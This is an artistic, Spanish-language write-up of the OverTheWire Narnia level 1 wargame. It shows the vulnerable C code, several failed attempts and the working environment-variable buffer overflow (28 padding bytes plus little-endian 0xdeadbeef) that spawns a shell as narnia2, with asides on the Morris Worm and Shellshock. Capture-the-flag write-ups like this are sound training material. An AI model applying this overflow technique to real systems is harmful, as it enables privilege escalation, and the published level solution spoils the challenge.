![banner](assets/narnia1_banner.png)

```bash
$ ssh narnia1@narnia.labs.overthewire.org -p 2226
```

```txt
> un binario que escucha
> una variable que obedece
> veintiocho bytes de distancia
```

---

# `> [RECON]`

```bash
$ cat /narnia/narnia1.c
```

```c
char buffer[20];
strcpy(buffer, getenv("EGG"));
if(val == 0xdeadbeef) system("/bin/sh");
```

Veinte bytes.

```txt
[ normal execution ]
```

↓

```txt
[ 0xdeadbeef ]
```

Eso fue todo lo que separó el stack

de una decisión que nunca debió obedecer input externo.

---

```bash
$ echo $VECTOR
```

```txt
> getenv busca
> strcpy obedece
> el stack recuerda todo
```

---

```bash
$ env | grep EGG
```

```txt
EGG=AAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```txt
input accepted.
```

```txt
trust misplaced.
```

---

# `> [ATTEMPTS]`

<details>
<summary><code>// 3l qu3 n0 s3 3qu1v0c4 n0 3st4 1nt3nt4nd0 n4d4.</code></summary>

```bash
# — intento 1
$ /narnia/narnia1

# segmentation fault
```

```txt
crash achieved.
control not achieved.
```

---

```bash
# — intento 2
$ export EGG=AAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ /narnia/narnia1
```

Nada.

Ni shell.
Ni control.

Solo ruido.

---

```bash
# — intento 3
$ export EGG=$(python3 -c 'print("A"*28 + "\xef\xbe\xad\xde")')
```

```txt
encoding corruption detected
```

Python decidió “ayudar”.

Error clásico.

---

```bash
# — intento 4
$ export EGG=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*28+b"\xef\xbe\xad\xde")')
$ /narnia/narnia1
```

```txt
euid=narnia2
```

Ahí.

</details>

---

```bash
$ printf 'A%.0s' {1..28}
```

Veintiocho bytes.

No treinta.

No veinte.

```txt
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
ef be ad de
```

La distancia exacta

entre input externo

y control de flujo.

---

```bash
$ echo $YEAR
```

```txt
1988
```

```txt
Morris Worm enters the network.
```

↓

```txt
2026
```

```txt
strcpy() sigue aquí.
```

---

# `> [STACK]`

```txt
low memory

[ buffer ][ padding ][ val ]

high memory
```

```txt
memory is contiguous.
trust is the vulnerability.
```

---

```bash
$ dmesg | tail
```

```txt
segmentation fault
```

Crashear no es controlar.

Muchos descubren eso tarde.

---

# `> [EXPLOIT]`

```bash
$ export EGG=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*28+b"\xef\xbe\xad\xde")')
```

```txt
little endian detected
```

Danny Cohen escribió sobre esto

mucho antes de que internet

convirtiera `0xdeadbeef`

en folklore.

---

```txt
[ finding ]
stack control achieved
```

---

# `> [ENVIRONMENT]`

```bash
$ echo $ENVIRONMENT
```

El vector nunca fue stdin.

Fue el entorno.

---

```txt
2014
Shellshock
CVE-2014-6271
```

Las variables de entorno

nunca fueron contexto inocente.

Solo estaban esperando

ejecución.

---

```txt
██████████████████████████████████
█                                █
█  getenv busca.                █
█  strcpy obedece.              █
█  el stack recuerda todo.      █
█                                █
██████████████████████████████████
```

```bash
$ echo $NEXT
> narnia2
```

---

> *→ [youtube.com/@t474-r0b07](https://youtube.com/@t474-r0b07)*
> *→ siguiente: [narnia2](../narnia2/)*

<!--
1988  : Morris Worm
1996  : Aleph One / Phrack
2014  : Shellshock / CVE-2014-6271
0xdeadbeef lives here.
-->
